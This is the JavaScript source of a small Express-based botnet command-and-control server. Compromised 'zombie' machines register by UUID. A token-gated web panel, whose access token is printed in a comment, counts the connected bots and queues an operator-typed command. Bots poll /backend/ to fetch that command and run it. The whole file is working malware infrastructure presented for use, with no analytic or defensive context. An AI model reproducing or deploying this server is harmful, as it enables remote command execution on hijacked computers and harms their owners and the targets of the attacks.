// import modules
const express = require('express')
var fs = require('fs');
var sha512 = require('js-sha512');
const app = express()
const bodyParser = require('body-parser');

app.use(bodyParser()); // make expressJS use bodyParser
const port = 8000 // port of command and control server
var payload = ["PAYLOAD"] // placeholder
var banned_ip = [] // IPs who try and fail to log in will be banned

// create folder from posted uuid
function zombifiy(data){
    uuid_dir = data;
    var dir = './'+uuid_dir;

    if (!fs.existsSync(dir)){
        fs.mkdirSync(dir);
    }
}


// get zombie(created files) count
const readdir = (path) => {
    return new Promise((resolve, reject) => {
      fs.readdir(path, (error, files) => {
        error ? reject(error) : resolve(files);
      });
    });
  };
  
  readdir("./").then((files) => {countDir(files.length);});
  
  
function countDir(x){
    global.dircount = x-1; // subtract one(itself) from counted files
}

// html base64 encoded image
var zombie_img_data = "data:image/png;base64,"


// expressJS
app.get('/', (req, res) => {
  try{
    if(banned_ip.includes(req.ip)){ // if current IP is banned
      console.log("Blocked request from banned IP "+req.ip) // Notify
      res.sendStatus(401) // send status code 401(unauthorized)
    }else{
      // gets the query string token and encrypts it with sha512 and if it matches with the correct token displays html 
      if(sha512(req.query.token) == "468ef7521224bf0bb7293ca35beda9fe41842b4c76862f2fb539702a0b86863f0d7e5302ca3dbb6affd42f0d1ca5925f9a2abd593773676b331f4ea0ebe6bc5d"){
        // only accessible with this query string --> 127.0.0.1:8000/?token=dS6EjKF7eYW8mdOKCX6JmKt78MdXOwn82Wpj64CC1we2yYgDcD_
        readdir("./").then((files) => {countDir(files.length);});
        var html = `<link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=Poppins&display=swap" rel="stylesheet"> <style>body { background-color: #007C77; } </style><h1 style="font-family: 'Poppins', sans-serif; text-align: center;">There are `+dircount+` current connections</h1><br><center><input id="cnc" type='text' placeholder='Enter command' style="text-align: center; top: -20px; position: relative;background-color: #60B2E5;border: none;height: 15%;height: 7.5%;color: #D9DCD6;border-radius: 10px;"></input><button onclick="submitData()">Execute</button></center><center><img src=`+zombie_img_data+` style="bottom: 0;"></center><script>function submitData(){if(confirm("Would you like to execute "+document.getElementById("cnc").value)){fetch("/xxsubmitxx/",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({payload:{cmd:document.getElementById("cnc").value}})})}}</script>`
        res.send(html)
      } else { // if the token is incorrect
        banned_ip.push(req.ip); // bans the IP
        res.sendStatus(401) // sends status code 401(unauthorized)
      }
  

    }
  } catch(e){ // if someone tried to error out the program
    try{
      banned_ip.push(req.ip); // bans the IP
      res.sendStatus(500) // sends internal server error
    } catch(e) {
      res.sendStatus(500) // if it cant ban just sends internal server error
    }

  }
})




app.post('/', (req, res) => { // on post request
  try{
    zombifiy(req.body.uuid); // get the uuid from the data of the post request
    res.sendStatus(200); // send status 200
  } catch(e){
    res.sendStatus(500) // send 500(internal server error)
  }

  })

app.get('/backend/', (req, res) => { 
  try{
    res.send(payload[0]) // display the payload
  } catch(e){
    res.sendStatus(500) // send status 500(internal server error)
  }
  

})

app.post('/xxsubmitxx/', (req, res) => { // this is where the payload is posted to
  try{
    payload.pop() // delete the old payload
    payload.push(req.body.payload.cmd) // add the new payload
    res.sendStatus(200); // send status 200
  } catch(e){
    res.sendStatus(500) // send status 500(internal server error)
  }

})

app.listen(port, () => {
    console.log(`Listening on port ${port}`) // [DEBUG]
})
